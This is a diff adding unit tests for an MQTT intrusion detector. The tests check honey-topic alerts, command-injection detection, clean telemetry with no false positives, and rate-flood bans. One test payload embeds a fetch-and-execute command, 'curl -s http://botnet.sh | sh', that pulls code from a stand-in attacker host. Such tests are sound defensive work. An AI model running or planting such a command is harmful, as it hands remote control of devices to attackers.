@@ -308,6 +308,67 @@ class TestIntrusionDetector(unittest.TestCase):
         self.assertEqual(self.db.get_persisted_threat_analytics()["total_threat_events"], 0)
         self.assertEqual(len(self.detector._events_history), 0)
 
+    def test_mqtt_honey_topic_breach_detection(self) -> None:
+        attacker_ip = "198.51.100.112"
+        # Publish to deceptive admin honey-topic
+        mitigation = self.detector.evaluate_mqtt_message(
+            topic="home/admin/config",
+            payload='{"action": "dump_network"}',
+            src_ip=attacker_ip,
+        )
+        self.assertIsNotNone(mitigation)
+        self.assertEqual(mitigation.src_ip, attacker_ip)
+        self.assertEqual(mitigation.severity, "CRITICAL")
+        self.assertTrue(self.firewall.is_ip_banned(attacker_ip))
+        self.assertIn("MQTT honey-topic breach", mitigation.reason)
+
+        # Port counter for 1883 incremented
+        analytics = self.detector.get_analytics()
+        self.assertGreaterEqual(analytics["target_ports"]["1883"], 1)
+
+    def test_mqtt_payload_command_injection_detection(self) -> None:
+        attacker_ip = "203.0.113.71"
+        # Publish malicious payload to standard sensor topic
+        mitigation = self.detector.evaluate_mqtt_message(
+            topic="home/sensors/temperature",
+            payload='{"temperature": 25.0, "exec": "curl -s http://botnet.sh | sh"}',
+            src_ip=attacker_ip,
+        )
+        self.assertIsNotNone(mitigation)
+        self.assertEqual(mitigation.src_ip, attacker_ip)
+        self.assertEqual(mitigation.severity, "CRITICAL")
+        self.assertTrue(self.firewall.is_ip_banned(attacker_ip))
+        self.assertIn("exploit command detected", mitigation.reason)
+
+    def test_mqtt_clean_telemetry_no_false_positives(self) -> None:
+        sensor_ip = "172.20.0.21"
+        # Standard benign IoT telemetry
+        mitigation = self.detector.evaluate_mqtt_message(
+            topic="home/sensors/temperature",
+            payload='{"temperature": 23.4, "unit": "C", "battery": 98}',
+            src_ip=sensor_ip,
+        )
+        self.assertIsNone(mitigation)
+        self.assertFalse(self.firewall.is_ip_banned(sensor_ip))
+
+    def test_mqtt_rate_flood_anomaly(self) -> None:
+        flood_ip = "198.51.100.165"
+        # Rapid flood beyond limit (20 msgs in 5s)
+        mitigation = None
+        for i in range(25):
+            mitigation = self.detector.evaluate_mqtt_message(
+                topic="home/devices/bulb",
+                payload=f'{{"state": "ON", "seq": {i}}}',
+                src_ip=flood_ip,
+            )
+            if mitigation:
+                break
+
+        self.assertIsNotNone(mitigation)
+        self.assertEqual(mitigation.src_ip, flood_ip)
+        self.assertTrue(self.firewall.is_ip_banned(flood_ip))
+        self.assertIn("rate anomaly", mitigation.reason)
+
 
 if __name__ == "__main__":
     unittest.main()
